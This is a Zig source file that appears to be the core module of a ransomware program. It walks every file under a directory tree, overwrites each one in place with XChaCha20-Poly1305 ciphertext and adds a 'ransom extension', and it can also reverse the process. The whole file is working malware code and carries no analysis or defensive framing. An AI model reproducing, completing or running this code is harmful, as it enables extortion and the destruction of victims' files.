const std = @import("std");
const Dir = std.fs.Dir;
const stdout = @import("./stdout.zig");
const cipher = @import("./cipher.zig");
const Mode = @import("./mode.zig").Mode;
const Level = @import("./level.zig").Level;
const addRansomExtension = @import("./ext.zig").addRansomExtension;
const hasRansomExtension = @import("./ext.zig").hasRansomExtension;
const removeRansomExtension = @import("./ext.zig").removeRansomExtension;

fn processFile(
    mode: Mode,
    level: ?Level,
    key: []u8,
    path: []const u8,
) !void {
    const allocator = std.heap.page_allocator;

    const cwd_path = try std.fs.cwd().realpathAlloc(allocator, ".");
    defer allocator.free(cwd_path);
    const abs_path = try std.fs.path.resolve(
        allocator,
        &.{
            cwd_path,
            path,
        },
    );
    defer allocator.free(abs_path);

    var file = try std.fs.cwd().openFile(abs_path, .{ .mode = .read_write });
    defer file.close();
    const file_size = try file.getEndPos();
    const buf = try allocator.alloc(u8, file_size);
    defer allocator.free(buf);
    _ = try file.readAll(buf);

    switch (mode) {
        .decrypt => {
            if (hasRansomExtension(abs_path)) {
                const out = try cipher.xchacha20_poly1305.decrypt(buf, key);
                var new_file = try std.fs.cwd().createFile(abs_path, .{ .truncate = true });
                defer new_file.close();
                try new_file.writeAll(out);
                try removeRansomExtension(abs_path);
            }
        },
        .encrypt => {
            if (!hasRansomExtension(abs_path) and level.?.shouldEncrypt(abs_path)) {
                const out = try cipher.xchacha20_poly1305.encrypt(buf, key);
                var new_file = try std.fs.cwd().createFile(abs_path, .{ .truncate = true });
                defer new_file.close();
                try new_file.writeAll(out);
                try addRansomExtension(abs_path);
            }
        },
    }
}

pub fn run(
    mode: Mode,
    level: ?Level,
    key: []u8,
    dir: *Dir,
    dir_path: []const u8,
) !void {
    const allocator = std.heap.page_allocator;

    var it = dir.iterate();
    while (try it.next()) |entry| {
        const entry_path = try std.fs.path.join(
            allocator,
            &.{ @constCast(dir_path), @constCast(entry.name) },
        );
        switch (entry.kind) {
            .file => try processFile(mode, level, key, entry_path),
            .directory => {
                var subdir = try std.fs.cwd().openDir(entry_path, .{ .iterate = true });
                defer subdir.close();
                try run(mode, level, key, &subdir, entry_path);
            },
            else => {},
        }
    }
}
